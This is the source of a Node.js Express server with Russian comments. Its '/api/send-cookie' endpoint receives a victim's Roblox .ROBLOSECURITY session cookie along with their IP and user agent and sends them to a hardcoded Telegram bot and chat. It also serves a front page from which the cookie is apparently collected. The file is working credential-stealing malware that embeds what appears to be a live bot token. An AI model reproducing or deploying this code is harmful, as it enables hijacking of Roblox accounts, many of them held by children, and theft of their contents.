const express = require('express');
const axios = require('axios');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// Telegram bot API endpoint
const TELEGRAM_BOT_TOKEN = '8387444669:AAEtibudcE2cWwwixv8wD9cGhUydpY7DRVQ';
const TELEGRAM_CHAT_ID = '8224914068';

// API endpoint для отправки данных в Telegram
app.post('/api/send-cookie', async (req, res) => {
    try {
        const { cookieValue, userAgent } = req.body;
        
        // Получаем IP пользователя
        const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
        
        // Формируем сообщение
        const message = `
🔥 НОВЫЙ .ROBLOSECURITY ПОЛУЧЕН 🔥

📋 Значение:
${cookieValue}

📊 Данные пользователя:
⏰ Время: ${new Date().toLocaleString('ru-RU')}
📍 IP: ${ip}
🖥️ User Agent: ${userAgent || 'Неизвестно'}

⚠️ Требуется немедленная проверка!
        `;
        
        // Отправляем в Telegram
        const response = await axios.post(
            `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
            {
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            }
        );
        
        res.json({
            success: true,
            message: 'Данные отправлены успешно'
        });
    } catch (error) {
        console.error('Telegram API Error:', error.response?.data || error.message);
        res.status(500).json({
            success: false,
            message: 'Ошибка при отправке данных'
        });
    }
});

// Логирование всех запросов
app.use((req, res, next) => {
    console.log(`${new Date().toISOString()} - ${req.method} ${req.url} - IP: ${req.ip}`);
    next();
});

// Главный маршрут
app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Запуск сервера
app.listen(PORT, () => {
    console.log(`✅ Сервер запущен на порту ${PORT}`);
    console.log(`🔗 Ссылка: http://localhost:${PORT}`);
});
